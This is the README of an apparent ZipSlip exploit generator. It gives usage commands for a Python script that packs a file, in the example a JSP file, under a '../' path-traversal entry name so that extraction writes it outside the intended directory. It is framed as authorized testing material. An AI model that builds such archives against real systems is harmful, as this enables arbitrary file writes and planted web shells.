ZipSlip Exploit 

a Python script to test ZipSlip . The script allows you to specify a path to include files in locations when the ZIP file is extracted.
Specify a  path (../) to the file you want to write.


Usage

Clone this repository:

git clone https://github.com/d3sca/zipslip-exploit-generator.git
cd zipslip-exploit-generator

Run the script with the following arguments:

python slip.py -n <zip_name> -p <file_path> -z <zip_slip_path>

Arguments

-n, --name: Name of the ZIP file to create.

-p, --path: Path to the file to include in the ZIP.

-z, --zipslip: Number of ../ sequences to include in the malicious payload path (e.g., ;../../../../../).

Example

Create a ZIP file named poc.zip containing file.jsp at a malicious path:

python slip.py -n poc.zip -p ./file.jsp -z ";../../../../../"

Output

The script generates a ZIP file with the specified payload path. You can use this file to test ZipSlip vulnerabilities in extraction utilities or applications.


Disclaimer

This script is for educational purposes and authorized testing only. Do not use it for malicious purposes.
Always obtain permission before testing on any system.
The author is not responsible for any misuse of this tool. Ensure you have appropriate permissions before using this script for testing purposes.
